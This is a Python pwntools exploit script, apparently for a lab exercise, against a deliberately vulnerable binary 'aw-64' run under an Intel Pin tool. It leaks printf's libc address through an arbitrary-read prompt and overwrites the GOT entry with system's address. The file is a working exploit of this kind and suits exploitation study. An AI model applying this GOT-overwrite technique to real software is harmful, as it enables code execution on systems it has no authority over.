#!/usr/bin/env python3

from pwn import *
from pwn import ELF, context, gdb, info, p64, process

program_name = "./aw-64"

program = f"/usr/local/pin/pin -t obj-intel64/part3.so -- {program_name}"
context.log_level = "info"
context.arch = "amd64"
context.bits = 64
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./aw-64")
p = process(
    program.split(),
    env={"PATH": ".:/bin:/usr/bin"},
)
libc = elf.libc
printf_got = elf.got["printf"]

# input_func
# puts("How many bytes do you want to read (N, in decimal)?");
print(p.recvuntil("decimal)?\n"))
read_size = "8"
p.sendline(read_size)
# puts("What is the address that you want to read (A, in hexadexmial, e.g., 0xffffde01)?");
print(p.recvuntil("01)?\n"))
p.sendline(hex(printf_got))
# printf("Writing %lu bytes to %p\n", read_bytes, ptr);
# print(p.recvline())
print(p.recvline())
printf_real_addr = p.unpack()
info("printf_real_addr: " + hex(printf_real_addr))

# calculate the system address
# printf_addr = 0x0000000000055810
# system_addr = 0x00000000000453A0
printf_addr = libc.symbols["printf"]
system_addr = libc.symbols["system"]
target_address = printf_real_addr + (system_addr - printf_addr)
info("target: " + hex(target_address))

# write_func
# puts("How many bytes do you want to write (N, in decimal, max 128 bytes)?");
print(p.recvuntil("bytes)?\n"))
p.sendline("16")
# "What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?"
print(p.recvuntil(")?\n"))
p.sendline(hex(printf_got))
# "Please provide your input (MAX %d bytes)",
# print(p.recv(timeout=5))
p.sendline(p64(target_address))
print(p.recvuntil("bytes)"))
p.close()
